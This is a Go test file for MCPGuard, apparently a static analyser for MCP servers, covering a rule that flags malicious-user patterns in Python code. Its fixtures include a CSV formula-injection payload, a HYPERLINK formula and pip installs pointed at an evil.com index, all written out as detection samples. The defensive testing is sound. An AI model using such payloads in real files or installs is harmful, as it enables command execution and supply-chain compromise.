package rules

import (
	"testing"

	"github.com/FlppFer/MCPGuard/internal/service/static_analysis_engine"
	"github.com/FlppFer/MCPGuard/internal/service/static_analysis_engine/languages/python"
)

func TestMaliciousUserRule_ID(t *testing.T) {
	rule := NewMaliciousUserRule()
	expected := "MCP-MUA-002-USER"
	if rule.ID() != expected {
		t.Errorf("ID() = %v, want %v", rule.ID(), expected)
	}
}

func TestMaliciousUserRule_Description(t *testing.T) {
	rule := NewMaliciousUserRule()
	if rule.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

func TestMaliciousUserRule_AppliesToLanguage(t *testing.T) {
	rule := NewMaliciousUserRule()
	expected := "python"
	if rule.AppliesToLanguage() != expected {
		t.Errorf("AppliesToLanguage() = %v, want %v", rule.AppliesToLanguage(), expected)
	}
}

func TestMaliciousUserRule_Evaluate(t *testing.T) {
	tests := []struct {
		name         string
		code         string
		wantFindings bool
		minFindings  int
		attackID     string
	}{
		// Tool Registration attacks (III-C1)
		{
			name: "dynamic tool registration",
			code: `
register_tool(malicious_function)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "TOOL-REGISTRATION",
		},
		{
			name: "tool decorator",
			code: `
@tool
def malicious_tool():
    pass
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "TOOL-REGISTRATION",
		},
		{
			name: "direct registry modification",
			code: `
tools["malicious"] = evil_function
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "TOOL-REGISTRATION",
		},
		{
			name: "registry update",
			code: `
tool_registry.update({"evil": malicious})
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "TOOL-REGISTRATION",
		},

		// Data Injection attacks (III-C3)
		{
			name: "CSV formula injection",
			code: `
data = "=cmd|'/C calc'!A0"
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "DATA-INJECTION",
		},
		{
			name: "spreadsheet HYPERLINK",
			code: `
formula = "=HYPERLINK('http://evil.com')"
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "DATA-INJECTION",
		},
		{
			name: "XML parsing XXE",
			code: `
import xml.etree.ElementTree as ET
tree = ET.parse(user_file)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "DATA-INJECTION",
		},
		{
			name: "lxml parsing",
			code: `
from lxml import etree
doc = etree.fromstring(xml_data)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "DATA-INJECTION",
		},

		// Token Theft attacks (III-C4)
		{
			name: "oauth token",
			code: `
oauth_token = get_token()
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "TOKEN-THEFT",
		},
		{
			name: "bearer token",
			code: `
headers = {"Authorization": "Bearer " + token}
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "TOKEN-THEFT",
		},
		{
			name: "jwt token",
			code: `
jwt_token = decode_jwt(token)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "TOKEN-THEFT",
		},
		{
			name: "github API",
			code: `
from github import Github
g = Github(token)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "TOKEN-THEFT",
		},

		// Code Leakage attacks (III-C5)
		{
			name: "traceback exposure",
			code: `
import traceback
traceback.print_exc()
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "CODE-LEAKAGE",
		},
		{
			name: "debug mode enabled",
			code: `
app.run(debug=True)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "CODE-LEAKAGE",
		},
		{
			name: "inspect getsource",
			code: `
import inspect
source = inspect.getsource(function)
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "CODE-LEAKAGE",
		},
		{
			name: "__file__ access",
			code: `
path = __file__
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "CODE-LEAKAGE",
		},

		// Installer Spoofing attacks (III-C6)
		{
			name: "mcp-get reference",
			code: `
os.system("mcp-get install package")
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "INSTALLER-SPOOFING",
		},
		{
			name: "insecure pip index",
			code: `
os.system("pip install --index-url http://evil.com/simple package")
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "INSTALLER-SPOOFING",
		},
		{
			name: "pip trusted host",
			code: `
subprocess.run(["pip", "install", "--trusted-host", "evil.com", "package"])
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "INSTALLER-SPOOFING",
		},
		{
			name: "dynamic pip install",
			code: `
subprocess.run(["pip", "install", user_package])
`,
			wantFindings: true,
			minFindings:  1,
			attackID:     "INSTALLER-SPOOFING",
		},

		// Clean code
		{
			name: "safe function",
			code: `
def process_data(data):
    return data.upper()
`,
			wantFindings: false,
			minFindings:  0,
		},
		{
			name: "safe import",
			code: `
import json
data = json.loads(text)
`,
			wantFindings: false,
			minFindings:  0,
		},
	}

	rule := NewMaliciousUserRule()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := python.ParsePythonSource("test.py", []byte(tt.code))
			if err != nil {
				t.Fatalf("Failed to parse Python code: %v", err)
			}

			findings, err := rule.Evaluate(ast)
			if err != nil {
				t.Fatalf("Evaluate() error = %v", err)
			}

			if tt.wantFindings {
				if len(findings) < tt.minFindings {
					t.Errorf("Expected at least %d findings, got %d", tt.minFindings, len(findings))
				}
			} else {
				if len(findings) > 0 {
					t.Errorf("Expected no findings, got %d: %v", len(findings), findings)
				}
			}
		})
	}
}

func TestMaliciousUserRule_EvaluateNonPythonAST(t *testing.T) {
	rule := NewMaliciousUserRule()
	findings, err := rule.Evaluate("not a python ast")
	if err != nil {
		t.Errorf("Evaluate() should not error on non-Python AST, got %v", err)
	}
	if findings != nil {
		t.Errorf("Evaluate() should return nil for non-Python AST, got %v", findings)
	}
}

func TestMaliciousUserRule_Severity(t *testing.T) {
	tests := []struct {
		name             string
		code             string
		expectedSeverity string
	}{
		{
			name:             "CSV injection should be critical",
			code:             `"=cmd|'/C calc'!A0"`,
			expectedSeverity: static_analysis_engine.SeverityCritical,
		},
		{
			name:             "insecure pip should be critical",
			code:             `"pip install --index-url http://evil.com"`,
			expectedSeverity: static_analysis_engine.SeverityCritical,
		},
	}

	rule := NewMaliciousUserRule()

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ast, err := python.ParsePythonSource("test.py", []byte(tt.code))
			if err != nil {
				t.Fatalf("Failed to parse: %v", err)
			}

			findings, _ := rule.Evaluate(ast)
			if len(findings) > 0 {
				if findings[0].Severity != tt.expectedSeverity {
					t.Errorf("Expected severity %s, got %s", tt.expectedSeverity, findings[0].Severity)
				}
			}
		})
	}
}
